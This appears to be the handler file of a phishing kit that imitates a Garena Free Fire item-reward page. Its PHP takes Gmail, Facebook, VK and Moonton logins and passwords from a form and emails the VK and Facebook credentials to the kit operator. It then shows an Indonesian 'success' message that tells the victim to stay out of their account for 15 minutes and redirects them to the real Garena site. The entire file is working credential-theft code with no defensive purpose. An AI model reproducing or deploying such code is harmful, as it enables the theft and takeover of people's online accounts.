<?php 
$nick = $_POST['nama'];
$gmail = $_POST['gp1'];
$pwgmail = $_POST['gp2'];
$fb = $_POST['fb1'];
$pwfb = $_POST['fb2'];
$vk = $_POST['vk1'];
$pwvk = $_POST['vk2'];
$momail = $_POST['mnt1'];
$mopw = $_POST['mnt2'];
$lvl = $_POST['level'];
$login = $_POST['login'];
$skin = $_POST['skin'];
$recover = $_POST['recover'];
$no = $_POST['nope'];
$country = $_POST['country'];

$body = "

-===¦ Akun VK ¦===-

|>> Email : ".$vk."
|>> Password : ".$pwvk."

-===¦ Akun Facebook ¦===-

|>> Email : ".$fb."
|>> Password : ".$pwfb."



-===¦ MANCING LAGE ¦===-
Kunjungi Website kami : Uhuinfo.com
Search google : Uhuinfo99

";

include 'emailmu.php';
$subject ="UHUINFO-FF AKUN [".$gmail."] ";
$headers ="From: uhuinfo@.com <uhuinfo@result.com>";
mail($emailku, $subject, $body, $headers);


$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>
<!DOCTYPE HTML>
<html>
  <head>
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Garena Free Fire - Success!
    </title>
    <link href='./img-zone/icon.png' rel='icon' type='image/x-png'/>
    <script type="text/javascript" src="./js-zone/main-zone.js">
    </script>
    <script language="JavaScript">document.write(zonehost())</script>
  </head>
  <body>
    <div class="form">
      <b>
        <font color="#fff" style="letter-spacing: 1px;">
           SUCCESS
          
        </font>
        <br/>
        <b>
          <u>
            <font color="#fff" style="letter-spacing: 1px;">
                          </font>
          </u>
        </b>
        <br/>
        <font color="#fff">
          <?php echo $_POST['nama']; ?> Anda telah berhasil mendapatkan item ini, jangan buka akun Anda selama 15 menit setelah mengambil hadiahnya!
        </font>
        <p/>
        <button type="submit" class="button-out button-block" onclick="location.href='https://ff.garena.com/';">Logout
        </button>
      </b>
    </div>
  </body>
</html>